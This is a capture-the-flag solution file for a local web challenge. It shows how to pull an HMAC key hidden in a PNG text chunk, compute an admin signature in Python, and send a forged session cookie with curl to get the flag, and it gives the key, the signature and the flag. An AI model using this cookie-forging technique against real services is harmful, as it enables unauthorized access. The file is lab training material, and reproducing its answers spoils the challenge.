
SOLUTION - Hidden Key Cookie Forge (complete)

1) Retrieve logo.png:
   curl -sS http://localhost:5000/static/logo.png -o logo.png

2) Extract PNG text chunk with strings or exiftool:
   strings logo.png | grep ctf_key
   # You will see: ctf_key\0supersecret_hmac_key_123

3) Craft signature:
   In Python:
   import hmac,hashlib
   key = "supersecret_hmac_key_123"
   username = "admin"
   sig = hmac.new(key.encode(), username.encode(), hashlib.sha256).hexdigest()
   print(sig)

   For this secret the signature for "admin" is:
   86f96cbc74c32acdadde613a7b5a7c2c6f639d0283aa6c2341e5cfcbad4f82b3

4) Request flag:
   curl -sS -H "Cookie: session=admin|86f96cbc74c32acdadde613a7b5a7c2c6f639d0283aa6c2341e5cfcbad4f82b3" http://localhost:5000/flag

Flag returned:
ISEP{YOU_MADE_IT_MATE}
